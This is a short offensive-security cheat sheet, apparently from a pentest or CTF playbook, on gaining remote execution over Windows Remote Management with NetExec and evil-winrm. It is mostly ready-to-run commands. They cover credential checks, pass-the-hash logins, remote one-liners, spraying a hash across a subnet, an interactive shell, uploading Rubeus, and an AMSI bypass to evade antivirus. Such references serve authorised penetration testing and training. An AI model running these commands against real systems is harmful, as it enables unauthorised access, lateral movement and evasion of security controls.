# 08.04 NetExec WinRM Remote Execution

> nxc winrm · evil-winrm interactive shell · PTH · port 5985/5986

## Overview

NetExec's WinRM module tests credentials and executes commands over Windows Remote Management (HTTP port 5985, HTTPS 5986). Requires the user to be in the Remote Management Users group or be a local administrator. evil-winrm provides a full interactive shell with file transfer, PowerShell history, and in-memory assembly loading. Prefer WinRM when SMB (445) is firewalled.

## Steps

- **Check access** — `nxc winrm <TARGET> -u <USER> -p <PASS>` → `(Pwn3d!)` means remote execution allowed.
- **Execute one-liners** — `-x 'cmd'` for quick commands.
- **PTH support** — both nxc and evil-winrm accept `-H <HASH>`.
- **evil-winrm** — full interactive shell; supports `upload`, `download`, and PS module loading.

## Commands

### NetExec WinRM auth and exec

```bash
# Check access
nxc winrm <TARGET> -u <USER> -p '<PASS>'
nxc winrm <TARGET> -u <USER> -H <HASH>

# Execute a command
nxc winrm <TARGET> -u <USER> -p <PASS> -x 'whoami'
nxc winrm <TARGET> -u <USER> -H <HASH> -x 'hostname'

# Spray WinRM across a subnet
nxc winrm <CIDR> -u <USER> -H <HASH> --continue-on-success
```

### evil-winrm interactive shell

```bash
# Password auth
evil-winrm -i <TARGET> -u <USER> -p '<PASS>'

# Pass-the-Hash
evil-winrm -i <TARGET> -u <USER> -H <HASH>

# HTTPS (port 5986)
evil-winrm -i <TARGET> -u <USER> -p <PASS> -S

# Inside the shell:
#   upload /local/Rubeus.exe C:\\Temp\\Rubeus.exe
#   download C:\\Users\\admin\\flag.txt /tmp/flag.txt
#   menu    → list available PS modules (Bypass-4MSI, Invoke-Binary, etc.)
#   Bypass-4MSI   → AMSI bypass before loading anything
```
